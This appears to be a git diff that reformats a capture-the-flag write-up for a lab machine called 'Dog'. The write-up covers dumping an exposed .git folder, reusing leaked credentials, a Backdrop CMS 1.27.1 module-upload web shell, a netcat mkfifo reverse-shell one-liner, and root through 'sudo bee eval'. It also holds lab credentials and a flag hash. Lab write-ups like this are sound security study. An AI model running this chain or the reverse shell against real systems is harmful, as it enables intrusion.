@@ -1,17 +1,19 @@
 ---
 sticker: emoji//1f436
 ---
-# ENUMERATION
----
 
+# DOG
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
 
+### OPEN PORTS
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 22   | ssh     |
 | 80   | http    |
 
@@ -48,40 +50,35 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## RECONNAISSANCE
 
-# RECONNAISSANCE
----
+***
 
 Let's start, following the scan we can notice that `/robots.txt` is allowed so, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310134947.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310134947.png)
 
 If we go to `/?q=admin`, we can check this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310135422.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310135422.png)
 
 As it was clear, we are unable to access admin resources at this point, let's keep looking around.
 
 If we remember the scan correctly, we had a git repository, let's check it out first:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310140430.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310140430.png)
 
 Nice, we know we are dealing with a `.git` we can use `GitHack` to rebuild the source code from a `.git` folder while keeping the directory structure unchanged.
 
 [Githack](https://github.com/lijiejie/GitHack)
 
-
 Now, after we use it, we can see this:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310175211.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310175211.png)
 
 We got a `settings.php` file, let's read it:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310175240.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310175240.png)
 
 If we try those credentials at the login page, we are unable to log in, it seems like the username is wrong, after looking around for a while I found a file located at:
 
@@ -113,7 +110,6 @@ If we read it:
 
 ```
 
-
 Found an username:
 
 ```
@@ -122,32 +118,27 @@ tiffany:BackDropJ2024DS2024
 
 Now, if try these credentials, we get access:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310175641.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310175641.png)
 
 Let's start exploitation.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 We are dealing with `Backdrop CMS 1.27.1`, we can try searching for an exploit regarding this version:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310175803.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310175803.png)
 
 When we use the exploit:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310180447.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310180447.png)
 
 Let's go to the URL and upload the crafted payload:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310180517.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310180517.png)
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310180534.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310180534.png)
 
 So, we need to modify the file for it to match `.tar.gz`, in order to automate the process, I modified the python script:
 
@@ -238,18 +229,17 @@ if __name__ == "__main__":
         main(sys.argv[1])
 ```
 
-
 Now, let's upload our file and visit this:
 
 ```
 modules/shell/shell.php
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310181029.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310181029.png)
 
 Let's try to execute a command:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310181304.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310181304.png)
 
 There we go, we got RCE, let's send ourselves a reverse shell:
 
@@ -257,13 +247,13 @@ There we go, we got RCE, let's send ourselves a reverse shell:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310181823.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310181823.png)
 
 Let's begin privesc.
 
-# PRIVILEGE ESCALATION
----
+## PRIVILEGE ESCALATION
 
+***
 
 First thing to do is to stable our shell:
 
@@ -277,7 +267,7 @@ First thing to do is to stable our shell:
 
 Once we are in the machine, we can see which users are in here too:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310182315.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310182315.png)
 
 We got another user `johncusack`, we can try switching user using the credentials we found at the beginning:
 
@@ -300,7 +290,6 @@ cb29ae50efe5a11a2183ca43018fb7a8
 ```
 
 Now, let's start our privesc, let's begin by checking our privileges:
-
 
 ```
 bash-5.0$ sudo -l
@@ -403,18 +392,17 @@ function bee_browser_load_html() {
 }
 ```
 
-- **Unsanitized Code Execution in `bee eval`**:  
-    The `bee eval` command is designed to execute PHP code (e.g., for debugging or CMS tasks). However, it does not restrict code execution, allowing attackers to run arbitrary commands.
+* **Unsanitized Code Execution in `bee eval`**:\
+  The `bee eval` command is designed to execute PHP code (e.g., for debugging or CMS tasks). However, it does not restrict code execution, allowing attackers to run arbitrary commands.
 
 In order to exploit this, let's do the following
-
 
 ```
 cd /var/www/html
 sudo /usr/local/bin/bee eval "system('/bin/bash');"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310184558.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310184558.png)
 
 We got root access and can finally access our final flag:
 
@@ -425,5 +413,4 @@ root@dog:/var/www/html# cat /root/root.txt
 
 Just like that, CTF is done.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250310184641.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250310184641.png)
